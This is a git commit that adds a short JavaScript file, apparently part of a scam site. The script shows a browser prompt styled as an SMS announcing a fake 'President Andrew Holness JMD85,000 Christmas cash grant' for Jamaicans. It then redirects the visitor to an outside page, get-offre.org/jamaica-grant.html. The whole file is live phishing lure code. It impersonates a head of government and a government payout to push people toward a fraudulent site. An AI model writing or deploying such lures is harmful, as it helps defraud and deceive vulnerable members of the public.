5d5029ec9421c11cfcc39f4be7437381ae485e96
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-12-07 03:17:29 -0800

    Create jamaica-active.js

---
+++ jamaica-active.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW JMD85,000'
+password=prompt('SMS: Congratulations You are qualify for President ANDREW HOLNESS JMD85,000 CHRISTMAS CASH GRANT FOR JAMAICANS, Kindly Press OK to Withdraw X-MAS Cash Grant   ','WITHDRAW JMD85,000');
+if (password != 'WITHDRAW JMD85,000') {
+location.href='https://get-offre.org/jamaica-grant.html';
+}
